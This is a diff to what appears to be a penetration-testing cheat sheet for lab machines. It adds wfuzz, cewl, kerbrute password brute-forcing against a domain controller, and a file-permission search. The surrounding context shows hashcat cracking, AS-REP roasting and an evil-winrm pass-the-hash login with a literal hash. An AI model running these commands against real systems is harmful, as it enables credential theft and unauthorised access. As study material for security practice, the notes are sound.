@@ -36,6 +36,10 @@ Range of values:
 
    $ wfuzz -z range --zD 0-3 -z list --zD "'" -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A
 
+From stdin
+
+   $ egrep '.jsp$' raft-large-files-lowercase.txt | wfuzz -z stdin --hc 404 http://site/service/FUZZ
+
 Reference: [wfuzz manual](https://wfuzz.readthedocs.io/en/latest/user/advanced.html)
 
 ## LDAP
@@ -76,6 +80,10 @@ Cracking with hashcat:
 
     # hashcat --example-hashes | grep -i -B 1 -A 1 filezilla
     # hashcat --force -m 15000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+Building wordlists by scrapping a website:
+
+   # cewl http://website > dic.txt
 
 
 # Services
@@ -213,6 +221,10 @@ Execute command from PowerShell
 
     GetNPUsers.py domain/user -no-pass
 
+ - Kerbrute
+
+    kerbrute_linux_amd64 bruteuser -d fabricorp.local --dc 10.10.10.193 /usr/share/wordlists/rockyou.txt bnielson
+ 
  - Pass the hash: You can connect using the hash of the user
 
     evil-winrm -i htb.local -u ADMINISTRATOR --hash 32693b11e6aa90eb43d32c72a07ceea6
@@ -270,6 +282,10 @@ View actions of process:
    # [pspy64](https://github.com/DominicBreuker/pspy)
 
 ### Find interesting files
+
+Find readable files, sorted by date:
+
+    # find . -type f  -perm -004 -exec ls -l --time-style="+%Y-%m-%d" {} \; 2>&1 | grep -v Permission | cut -d' ' -f6,7 | sort
 
 Find backups files:
 
@@ -388,6 +404,10 @@ Put all users in users.txt and all passwords in passwords.txt. Use scanners from
 Find CVE
 
     # searchsploit filezilla
+
+# Android
+
+unzip file.apk
 
 ## Resources
 
